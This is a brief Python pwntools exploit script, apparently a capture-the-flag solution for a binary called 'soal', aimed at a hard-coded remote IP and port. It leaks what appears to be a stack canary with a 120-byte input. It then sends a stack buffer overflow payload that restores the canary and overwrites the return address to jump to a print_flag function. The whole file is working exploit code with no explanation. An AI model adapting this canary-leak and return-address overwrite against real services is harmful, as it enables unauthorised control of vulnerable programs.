from pwn import *
from Crypto.Util.number import bytes_to_long

# sh=process("./soal")
# sh=remote("localhost",13302)
sh = remote("104.248.150.36",11102)
# gdb.attach(sh,"""
# 	b *0x0000000000401344
# 	b *0x00000000004012ea
# 	# c
# 	""")

p = 'a'*(120)
sh.sendline(p)

sh.recvline()
leak= sh.recv(7).rjust(8,"\x00")
leak= u64(leak)

print "leak :",hex(leak)

p = 'b'*72
p+= p64(leak)
p+= p64(0)
p+= p64(0x4011b2) # print_flag

sh.send(p)

sh.interactive()